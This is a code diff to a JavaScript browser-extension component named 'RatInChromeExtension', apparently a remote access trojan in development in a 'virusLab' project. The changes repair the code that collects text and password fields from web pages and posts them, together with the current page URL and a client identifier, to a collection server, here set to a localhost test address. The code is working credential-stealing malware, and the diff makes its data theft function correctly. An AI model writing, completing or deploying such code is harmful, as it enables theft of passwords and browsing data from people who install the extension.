@@ -4,8 +4,8 @@
 
 function sendDataToServer(url, data)
 {
-  JQuery.post(
-    url, data
+  $.post(
+    url, {"ri":JSON.stringify(data)}
   );
 }
 
@@ -39,24 +39,24 @@ function getTextAndPasswordFields() {
 function RatInChromeExtension(server) {
   this._server = server; // it can be make url or email
   this._data = null;
-  this._client = null; // some info for identification
+  this._client = "test1"; // some info for identification
   this.getData = null;
   this.sendData = null;
 }
 
 // this is not a factory :( yet
 function RatInChromeExtensionFactory(server_url, getDataFunction, sendDataFunction) {
-  var rat = RatInChromeExtension(server_url);
+  var rat = new RatInChromeExtension(server_url);
   rat.getData = function() {
     this._data = getDataFunction();
   };
   rat.sendData = function() {
     data = {
       "c": this._client,
-      "i": {
+      "i": JSON.stringify({
         "curl": window.location.href,
         "info": this._data
-      }
+      })
     };
     sendDataFunction(this._server, data);
   }
@@ -65,7 +65,7 @@ function RatInChromeExtensionFactory(server_url, getDataFunction, sendDataFuncti
 
 // it's just for testing
 var rat = RatInChromeExtensionFactory(
-  "http://127.0.0.1:8080/work/virusLab/RatInChromeServerSide/", 
+  "http://127.0.0.1:8080", 
   getTextAndPasswordFields,  sendDataToServer
 );
 
